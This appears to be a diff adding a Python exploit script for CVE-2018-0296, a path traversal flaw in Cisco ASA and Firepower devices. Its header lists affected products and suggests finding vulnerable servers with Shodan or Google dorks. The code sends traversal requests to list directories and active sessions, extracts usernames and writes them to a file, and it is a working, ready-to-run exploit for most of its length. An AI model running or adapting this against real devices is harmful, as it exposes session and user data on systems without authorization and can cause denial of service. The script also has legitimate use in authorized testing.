@@ -1,0 +1,107 @@
+'''
+Cisco Adaptive Security Appliance - Path Traversal (CVE-2018-0296)
+A security vulnerability in Cisco ASA that would allow an attacker to view sensitive system information without authentication by using directory traversal techniques.
+
+Vulnerable Products
+This vulnerability affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software that is running on the following Cisco products:
+
+3000 Series Industrial Security Appliance (ISA)
+ASA 1000V Cloud Firewall
+ASA 5500 Series Adaptive Security Appliances
+ASA 5500-X Series Next-Generation Firewalls
+ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers
+Adaptive Security Virtual Appliance (ASAv)
+Firepower 2100 Series Security Appliance
+Firepower 4100 Series Security Appliance
+Firepower 9300 ASA Security Module
+FTD Virtual (FTDv)
+Script usage
+Installation: git clone https://github.com/yassineaboukir/CVE-2018-0296.git
+Usage: python cisco_asa.py <URL>
+If the web server is vulnerable, the script will dump in a text file both the content of the current directory, files in +CSCOE+ and active sessions.
+
+Disclaimer: please note that due to the nature of the vulnerability disclosed to Cisco, this exploit could result in a DoS so test at your own risk.
+
+Bug Bounty Recon
+You can use Shodan, Censys or any other OSINT tools to enumerate vulnerable servers or simply google dork /+CSCOE+/logon.html. Figure it out :)
+
+References:
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd
+'''
+
+#!/usr/bin/env python
+
+import requests
+import sys
+import urlparse
+import os
+import re
+
+print("""
+      _____ _____ _____ _____ _____    ___   _____  ___         
+     /  __ \_   _/  ___/  __ \  _  |  / _ \ /  ___|/ _ \        
+     | /  \/ | | \ `--.| /  \/ | | | / /_\ \\ `--./ /_\ \       
+     | |     | |  `--. \ |   | | | | |  _  | `--. \  _  |       
+     | \__/\_| |_/\__/ / \__/\ \_/ / | | | |/\__/ / | | |       
+      \____/\___/\____/ \____/\___/  \_| |_/\____/\_| |_/        
+                                                                
+______     _   _       _____                                  _ 
+| ___ \   | | | |     |_   _|                                | |
+| |_/ /_ _| |_| |__     | |_ __ __ ___   _____ _ __ ___  __ _| |
+|  __/ _` | __| '_ \    | | '__/ _` \ \ / / _ \ '__/ __|/ _` | |
+| | | (_| | |_| | | |   | | | | (_| |\ V /  __/ |  \__ \ (_| | |
+\_|  \__,_|\__|_| |_|   \_/_|  \__,_| \_/ \___|_|  |___/\__,_|_|
+                                                                
+                CVE-2018-0296
+  Script author: Yassine Aboukir(@yassineaboukir)
+    """)
+
+requests.packages.urllib3.disable_warnings()
+
+url = sys.argv[1]
+
+regexSess = r"([0-9])\w+'"
+regexUser = r"(user:)\w+"
+
+dir_path = os.path.dirname(os.path.realpath(__file__))
+filelist_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
+CSCOE_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
+active_sessions = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"
+logon = "/+CSCOE+/logon.html"
+
+try:
+  is_cisco_asa = requests.get(urlparse.urljoin(url,logon), verify=False, allow_redirects=False)
+except requests.exceptions.RequestException as e:
+  print(e)
+  sys.exit(1)
+
+if "webvpnLang" in is_cisco_asa.cookies:
+    try:
+      filelist_r = requests.get(urlparse.urljoin(url,filelist_dir), verify=False)
+      CSCOE_r = requests.get(urlparse.urljoin(url,CSCOE_dir), verify=False)
+      active_sessions_r = requests.get(urlparse.urljoin(url,active_sessions), verify=False)
+
+    except requests.exceptions.RequestException as e:
+      print(e)
+      sys.exit(1)
+ 
+    if str(filelist_r.status_code) == "200":
+      with open(urlparse.urlparse(url).hostname+".txt", "w") as cisco_dump:
+        cisco_dump.write("======= Directory Index =========\n {}\n ======== +CSCEO+ Directory ========\n {}\n ======= Active sessions =========\n {}\n ======= Active Users =========\n".format(filelist_r.text, CSCOE_r.text, active_sessions_r.text))
+        
+        ''' Extraccion de usuarios'''
+        matches_sess = re.finditer(regexSess, active_sessions_r.text)
+        for match_sess in matches_sess:
+            active_users_r = requests.get(urlparse.urljoin(url,"/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"+str(match_sess.group().strip("'"))), verify=False)
+            matches_user = re.finditer(regexUser, active_users_r.text)
+
+            for match_user in matches_user:
+              cisco_dump.write(match_user.group()+"\n")
+        ''' Fin Extraccion de usuarios'''
+
+        print("Vulnerable! Check the text dump saved in {}".format(dir_path))
+    else: print("Not vulnerable!")
+
+else: 
+  print("This is not Cisco ASA! e.g: https://vpn.example.com/+CSCOE+/logon.html\n")
+  sys.exit(1)
